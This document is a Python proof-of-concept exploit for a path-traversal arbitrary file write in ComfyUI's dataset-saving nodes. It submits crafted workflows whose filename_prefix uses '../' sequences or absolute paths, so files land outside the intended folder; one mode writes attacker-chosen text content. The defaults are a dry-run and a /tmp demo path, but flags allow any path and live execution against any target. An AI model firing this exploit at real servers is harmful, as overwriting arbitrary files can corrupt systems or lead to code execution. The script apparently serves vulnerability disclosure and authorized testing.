#!/usr/bin/env python3
"""
PoC — ComfyUI arbitrary file write via SaveImageDataSetToFolder /
SaveImageTextDataSetToFolder (overwrite mode) filename_prefix traversal.

Vulnerability class: CWE-22 (path traversal) / CWE-73 (external control of
file name or path). Verified against ComfyUI v0.37.0 (master b33e2b5).

For AUTHORIZED security research only (your own instance / CTF / approved
bug-bounty scope). Default is a harmless dry-run; pass --execute to fire.

Usage:
  python3 poc_arbitrary_file_write.py --target http://127.0.0.1:8188 --mode traversal
  python3 poc_arbitrary_file_write.py --target http://127.0.0.1:8188 --mode absolute --execute
  python3 poc_arbitrary_file_write.py --target http://127.0.0.1:8188 --mode text --execute
"""

import argparse
import json
import sys
import urllib.request
import urllib.error

DEMO_DIR = "/tmp/comfyui_pwn_demo"  # benign, exists-checkable target directory


def http_json(method: str, url: str, payload: dict | None = None, timeout: int = 15):
    data = None if payload is None else json.dumps(payload).encode()
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")[:500]


def check_node_available(base: str) -> bool:
    status, body = http_json("GET", f"{base}/api/object_info/SaveImageDataSetToFolder")
    if status != 200 or "SaveImageDataSetToFolder" not in body:
        print(f"[-] node not registered (HTTP {status}). Old version or patched?")
        return False
    print("[+] vulnerable nodes registered (SaveImageDataSetToFolder present)")
    return True


def build_prompt(mode: str, prefix: str) -> dict:
    empty = {"1": {"class_type": "EmptyImage",
                   "inputs": {"width": 16, "height": 16, "color": 16711680, "batch_size": 1}}}
    if mode == "text":
        # fully attacker-controlled .txt content variant
        empty["2"] = {"class_type": "SaveImageTextDataSetToFolder", "inputs": {
            "images": ["1", 0], "texts": "PWNED-BY-POC arbitrary attacker-controlled content",
            "folder_name": "dataset", "filename_prefix": prefix, "mode": "overwrite"}}
    else:
        empty["2"] = {"class_type": "SaveImageDataSetToFolder", "inputs": {
            "images": ["1", 0],
            "folder_name": "dataset", "filename_prefix": prefix, "mode": "overwrite"}}
    return {"prompt": empty}


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:8188")
    ap.add_argument("--mode", choices=["absolute", "traversal", "text"], default="traversal")
    ap.add_argument("--prefix", default=None,
                    help="file path prefix WITHOUT the forced '_NNNNN' suffix "
                         "(default: benign demo path under /tmp)")
    ap.add_argument("--execute", action="store_true",
                    help="actually send the exploit (default: dry-run that only checks node presence)")
    args = ap.parse_args()

    prefix = args.prefix
    if prefix is None:
        prefix = {
            "absolute": f"{DEMO_DIR}/owned_abs",
            "traversal": f"../../../../../../../../{DEMO_DIR.lstrip('/')}/owned_traversal",
            "text": f"{DEMO_DIR}/owned_text",
        }[args.mode]

    prompt = build_prompt(args.mode, prefix)
    suffix = "_00000.txt" if args.mode == "text" else "_00000.png"

    print(f"[*] target : {args.target}")
    print(f"[*] mode   : {args.mode}")
    print(f"[*] prefix : {prefix}  ->  expected file: {prefix}{suffix}")

    if not args.execute:
        print("[i] dry-run. Checking node availability only. Re-run with --execute to fire.")
        ok = check_node_available(args.target)
        print(json.dumps(prompt, indent=2))
        return 0 if ok else 1

    if not check_node_available(args.target):
        return 1
    status, body = http_json("POST", f"{args.target}/prompt", prompt)
    print(f"[*] /prompt -> HTTP {status}: {json.dumps(body)[:300]}")
    if status == 200 and isinstance(body, dict) and body.get("prompt_id"):
        print(f"[+] workflow queued: prompt_id={body['prompt_id']}")
        print(f"[+] verify the file exists, e.g.: ls -la {prefix}{suffix}")
        return 0
    print("[-] exploit request failed")
    return 1


if __name__ == "__main__":
    sys.exit(main())
